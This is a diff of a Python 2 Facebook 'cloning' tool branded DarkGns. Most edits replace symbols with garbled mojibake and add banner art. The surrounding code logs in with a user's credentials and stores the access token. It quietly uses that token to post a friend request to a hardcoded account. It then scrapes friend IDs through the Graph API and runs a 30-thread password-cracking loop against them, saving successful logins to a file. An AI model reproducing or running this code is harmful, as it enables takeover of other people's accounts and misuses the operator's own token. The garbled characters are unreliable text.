@@ -47,10 +47,23 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """☣️DarkGns☣️
- ☣️cloning method☣️
+logo = """вЈпёЏDarkGnsвЈпёЏ
+ вЈпёЏcloning methodвЈпёЏ
  
- Note:do not use this tool illegally⚠️⚠️
+───────────────────────────────────────────────────────────────────
+─████████████───██████████████─████████████████───██████──████████─
+─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒██──██▒▒▒▒██─
+─██▒▒████▒▒▒▒██─██▒▒██████▒▒██─██▒▒████████▒▒██───██▒▒██──██▒▒████─
+─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██────██▒▒██───██▒▒██──██▒▒██───
+─██▒▒██──██▒▒██─██▒▒██████▒▒██─██▒▒████████▒▒██───██▒▒██████▒▒██───
+─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██───
+─██▒▒██──██▒▒██─██▒▒██████▒▒██─██▒▒██████▒▒████───██▒▒██████▒▒██───
+─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██─────██▒▒██──██▒▒██───
+─██▒▒████▒▒▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██████─██▒▒██──██▒▒████─
+─██▒▒▒▒▒▒▒▒████─██▒▒██──██▒▒██─██▒▒██──██▒▒▒▒▒▒██─██▒▒██──██▒▒▒▒██─
+─████████████───██████──██████─██████──██████████─██████──████████─
+───────────────────────────────────────────────────────────────────
+ Note:do not use this tool illegallyвљ пёЏвљ пёЏ
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mDark Gns
 \033[1;96mInstagram \033[1;93m: \033[1: none
@@ -61,7 +74,7 @@ logo = """☣️DarkGns☣️
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[в—Џ] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -78,19 +91,19 @@ print "\033[1;96m ============================================================="
 print  """\033[1;91m
  
 
-┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7
-┄1�7████████████┄1�7┄1�7┄1�7██████████████┄1�7████████████████┄1�7┄1�7┄1�7██████┄1�7┄1�7████████┄1�7
-┄1�7██▒▒▒▒▒▒▒▒████┄1�7██▒▒▒▒▒▒▒▒▒▒██┄1�7██▒▒▒▒▒▒▒▒▒▒▒▒██┄1�7┄1�7┄1�7██▒▒██┄1�7┄1�7██▒▒▒▒██┄1�7
-┄1�7██▒▒████▒▒▒▒██┄1�7██▒▒██████▒▒██┄1�7██▒▒████████▒▒██┄1�7┄1�7┄1�7██▒▒██┄1�7┄1�7██▒▒████┄1�7
-┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒██┄1�7┄1�7┄1�7┄1�7██▒▒██┄1�7┄1�7┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7┄1�7┄1�7
-┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒██████▒▒██┄1�7██▒▒████████▒▒██┄1�7┄1�7┄1�7██▒▒██████▒▒██┄1�7┄1�7┄1�7
-┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒▒▒▒▒▒▒▒▒██┄1�7██▒▒▒▒▒▒▒▒▒▒▒▒██┄1�7┄1�7┄1�7██▒▒▒▒▒▒▒▒▒▒██┄1�7┄1�7┄1�7
-┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒██████▒▒██┄1�7██▒▒██████▒▒████┄1�7┄1�7┄1�7██▒▒██████▒▒██┄1�7┄1�7┄1�7
-┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7┄1�7┄1�7┄1�7┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7┄1�7┄1�7
-┄1�7██▒▒████▒▒▒▒██┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒██┄1�7┄1�7██▒▒██████┄1�7██▒▒██┄1�7┄1�7██▒▒████┄1�7
-┄1�7██▒▒▒▒▒▒▒▒████┄1�7██▒▒██┄1�7┄1�7██▒▒██┄1�7██▒▒██┄1�7┄1�7██▒▒▒▒▒▒██┄1�7██▒▒██┄1�7┄1�7██▒▒▒▒██┄1�7
-┄1�7████████████┄1�7┄1�7┄1�7██████┄1�7┄1�7██████┄1�7██████┄1�7┄1�7██████████┄1�7██████┄1�7┄1�7████████┄1�7
-┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7┄1�7  ====================================
+в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7
+в”„1¤7в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”„1¤7в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–€в–€в–€в–€в”„1¤7в”„1¤7в–€в–€в–€в–€в–€в–€в–€в–€в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–€в–€в–€в–€в”„1¤7в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–’в–’в–€в–€в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–’в–’в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в–’в–’в–€в–€в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–’в–’в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в–€в–€в”„1¤7
+в”„1¤7в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–€в–€в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–’в–’в–’в–’в–€в–€в”„1¤7в–€в–€в–’в–’в–€в–€в”„1¤7в”„1¤7в–€в–€в–’в–’в–’в–’в–€в–€в”„1¤7
+в”„1¤7в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”„1¤7в”„1¤7в”„1¤7в–€в–€в–€в–€в–€в–€в”„1¤7в”„1¤7в–€в–€в–€в–€в–€в–€в”„1¤7в–€в–€в–€в–€в–€в–€в”„1¤7в”„1¤7в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”„1¤7в–€в–€в–€в–€в–€в–€в”„1¤7в”„1¤7в–€в–€в–€в–€в–€в–€в–€в–€в”„1¤7
+в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7  ====================================
           
 \033[1;96mAuthor  \033[1;93m: \033[1;92mDark Gns
 \033[1;96mInstagram \033[1;93m: \033[1;92mnone
@@ -104,9 +117,9 @@ CorrectPassword = "Darkhacker"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
+    username = raw_input("\033[1;96m[в†] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
+    	password = raw_input("\033[1;96m[в†] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
@@ -126,7 +139,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
+		print('\033[1;96m[в†] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[в†]' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -155,7 +168,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
+				print '\n\033[1;96m[вњ“] \x1b[1;92mLogin Successful'
 				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -201,8 +214,8 @@ def menu():
 	os.system("clear")
 	print logo
 	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print "\033[1;96m[\033[1;97mвњ“\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;96m[\033[1;97mвњ“\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
@@ -253,7 +266,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
+		jalan('\033[1;96m[вњє] \033[1;93mGetting ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -266,12 +279,12 @@ def pilih_super():
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
+			print"\033[1;96m[\033[1;97mвњ“\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mGetting IDs \033[1;97m...')
+		jalan('\033[1;96m[вњє] \033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -295,10 +308,10 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m[✺] \033[1;93mStarting \033[1;97m...')
+	jalan('\033[1;96m[вњє] \033[1;93mStarting \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[\033[1;97mвњё\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
 	print 42*"\033[1;96m="
@@ -421,7 +434,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed Komail says Thank You♥️ \033[1;97m....'
+	print '\033[1;96m[\033[1;97mвњ“\033[1;96m] \033[1;92mProcess Has Been Completed Komail says Thank Youв™ҐпёЏ \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
